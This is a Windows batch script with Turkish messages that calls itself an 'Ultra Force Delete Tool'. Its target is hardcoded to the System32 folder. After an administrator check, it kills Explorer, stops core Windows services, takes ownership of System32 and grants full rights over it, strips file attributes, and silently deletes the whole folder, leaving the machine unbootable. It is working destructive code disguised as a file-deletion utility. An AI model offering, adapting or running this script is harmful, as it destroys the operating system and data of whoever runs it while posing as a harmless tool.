@echo off
setlocal EnableDelayedExpansion
title Ultra Force Delete Tool - Tüm Dosyaları Sil
color 0C

:: Yonetici yetkisi kontrolu
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [!] HATA: Administrator yetkisi gerekli!
    echo [!] Lutfen bu dosyayi yonetici olarak calistirin.
    pause
    exit /B 1
)

:: Silinecek klasor yolu
set "targetPath=%windir%\System32"

echo [+] ULTRA FORCE DELETE TOOL BASLATILIYOR...
echo [+] Hedef: %targetPath%
echo.

:: Acik dosyalari kapat
echo [*] Acik dosyalar kontrol ediliyor...
taskkill /F /IM notepad.exe >nul 2>&1
taskkill /F /IM wordpad.exe >nul 2>&1
taskkill /F /IM explorer.exe >nul 2>&1

:: Tum servisleri durdur
echo [*] Kritik servisler durduruluyor...
net stop TrustedInstaller /y >nul 2>&1
net stop WuauServ /y >nul 2>&1
net stop msiserver /y >nul 2>&1
net stop WSearch /y >nul 2>&1

:: Sistem yetkilerini kaldir
echo [*] Sistem yetkileri kaldiriliyor...
icacls "%targetPath%" /setowner "Administrators" /T /C >nul 2>&1
icacls "%targetPath%" /reset /T >nul 2>&1

:: Tum yetkileri al
echo [*] Tum yetkiler aliniyor...
takeown /F "%targetPath%" /A /R /D Y >nul 2>&1
icacls "%targetPath%" /grant:r Administrators:F /T /C /Q >nul 2>&1
icacls "%targetPath%" /grant:r %username%:F /T /C /Q >nul 2>&1

:: Dosya sistemi kontrolu
echo [*] Dosya sistemi kontrolu yapiliyor...
chkdsk /F >nul 2>&1

:: Ultra force silme
echo [*] Ultra force silme basliyor...
attrib -r -s -h "%targetPath%" /s /d >nul 2>&1
rd /s /q "%targetPath%" >nul 2>&1

:: Son kontrol
if exist "%targetPath%" (
    echo [!] HATA: Klasor silinemedi!
    echo [!] Lutfen Windows Guvenli Modda tekrar deneyin.
) else (
    echo [+] BASARILI: Klasor ve tum icerigi silindi!
)

:: Servisleri yeniden baslat
echo [*] Servisler yeniden baslatiliyor...
net start TrustedInstaller >nul 2>&1
net start WuauServ >nul 2>&1
net start msiserver >nul 2>&1
net start WSearch >nul 2>&1

echo.
echo [+] Islem tamamlandi!
timeout /t 5
exit /B 0
